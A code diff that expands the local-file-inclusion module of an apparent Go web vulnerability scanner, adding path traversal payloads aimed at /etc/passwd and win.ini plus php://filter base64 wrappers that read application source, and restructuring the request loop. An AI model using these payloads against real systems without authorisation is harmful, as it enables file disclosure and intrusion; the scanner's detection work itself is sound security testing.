@@ -33,12 +33,19 @@ var traversalPayloads = []struct {
 	Regex   *regexp.Regexp
 }{
 	{"../../../../etc/passwd", rootPasswdRegex},
+	{"../../../../../../../../etc/passwd", rootPasswdRegex},
+	{"../../../../../../../../../../etc/passwd", rootPasswdRegex},
+	{"../../../../../../../../etc/passwd%00", rootPasswdRegex},
 	{"..%2f..%2f..%2f..%2fetc%2fpasswd", rootPasswdRegex},
+	{"..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd", rootPasswdRegex},
 	{"..%252f..%252f..%252f..%252fetc%252fpasswd", rootPasswdRegex},
 	{"....//....//....//etc/passwd", rootPasswdRegex},
+	{"....//....//....//....//....//....//etc/passwd", rootPasswdRegex},
 	{"/etc/passwd", rootPasswdRegex},
 	{"../../../../windows/win.ini", winIniRegex},
+	{"../../../../../../../../windows/win.ini", winIniRegex},
 	{"..\\..\\..\\..\\windows\\win.ini", winIniRegex},
+	{"..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini", winIniRegex},
 }
 
 func (m *LFIModule) Run(target *Target, c *client.Client) ([]*Finding, error) {
@@ -46,15 +53,21 @@ func (m *LFIModule) Run(target *Target, c *client.Client) ([]*Finding, error) {
 	isPost := strings.ToUpper(target.Method) == "POST"
 
 	for _, param := range target.Parameters() {
-		// 1. PHP Filter check
-		phpFilterPayload := "php://filter/convert.base64-encode/resource=index.php"
-		var filterResp *client.Response
-		var err error
-		if isPost {
-			filterResp, err = c.Request("POST", target.URL, target.BuildDataWithParam(param, phpFilterPayload), nil)
-		} else {
-			filterResp, err = c.Request("GET", target.BuildURLWithParam(param, phpFilterPayload), "", nil)
+		// 1. PHP Filter checks (both with and without .php for appended extensions)
+		phpFilters := []string{
+			"php://filter/convert.base64-encode/resource=index.php",
+			"php://filter/convert.base64-encode/resource=index",
+			"php://filter/read=convert.base64-encode/resource=index.php",
+			"php://filter/read=convert.base64-encode/resource=index",
 		}
+		for _, phpFilterPayload := range phpFilters {
+			var filterResp *client.Response
+			var err error
+			if isPost {
+				filterResp, err = c.Request("POST", target.URL, target.BuildDataWithParam(param, phpFilterPayload), nil)
+			} else {
+				filterResp, err = c.Request("GET", target.BuildURLWithParam(param, phpFilterPayload), "", nil)
+			}
 
 		if err == nil && filterResp.Body != "" {
 			blobs := base64BlobRegex.FindAllString(filterResp.Body, -1)
@@ -75,10 +88,10 @@ func (m *LFIModule) Run(target *Target, c *client.Client) ([]*Finding, error) {
 						Remediation: "Disable PHP stream wrappers in user-controlled file inclusion and validate against an allow-list.",
 						CWEID:       98,
 					})
-					break
 				}
 			}
 		}
+	}
 
 		if len(findings) > 0 {
 			continue
@@ -87,6 +100,7 @@ func (m *LFIModule) Run(target *Target, c *client.Client) ([]*Finding, error) {
 		// 2. Path Traversal checks
 		for _, item := range traversalPayloads {
 			var resp *client.Response
+			var err error
 			if isPost {
 				resp, err = c.Request("POST", target.URL, target.BuildDataWithParam(param, item.Payload), nil)
 			} else {
